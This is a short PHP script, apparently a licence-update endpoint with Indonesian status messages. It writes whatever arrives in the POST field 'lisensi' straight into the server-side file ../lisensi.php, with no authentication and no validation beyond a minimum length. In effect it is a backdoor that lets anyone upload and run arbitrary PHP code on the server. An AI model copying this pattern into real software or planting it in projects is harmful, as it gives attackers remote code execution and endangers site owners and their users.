<?php
	$txt = $_POST['lisensi'];

	if ( !count($_POST) || (strlen($txt) <  1000) ) {
		die("Gagal Terhubung");
	}




	$myfile = fopen("../lisensi.php", "w") or die("Unable to open file!");


	if (fwrite($myfile, $txt)) {
		echo 'Sukses';
	};
	fclose($myfile);


